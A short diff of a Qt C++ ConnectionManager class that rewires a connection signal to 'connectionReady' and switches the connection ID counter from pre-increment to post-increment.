@@ -6,7 +6,7 @@ ConnectionManager::ConnectionManager(Stealth* stealth,MessageManager* mngMessage
     this->stealth=stealth;
     this->connectionIndex=0;
 
-    connect(this,SIGNAL(connectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
+    connect(this,SIGNAL(connectionReady(Connection*)),this,SLOT(addConnection(Connection*)));
     connect(mngMessage,SIGNAL(receivedHandshake(Connection*)),this,SLOT(processHandshake(Connection*)));
     connect(mngMessage,SIGNAL(receivedLoaderOk(Connection*)),this,SLOT(sendPluginManager(Connection*)));
     connect(mngMessage,SIGNAL(receivedHanshakeOk(Connection*)),this,SLOT(checkHandshakeOk(Connection*)));
@@ -159,7 +159,7 @@ void ConnectionManager::checkHandshakeOk(Connection* connection)
 
     qDebug()<<"Confirmación Hanshake correcto, conexión lista";
 
-    connection->setID(++connectionIndex);
+    connection->setID(connectionIndex++);
 
     connection->setState(Connection::Ready);
     emit connectionReady(connection);
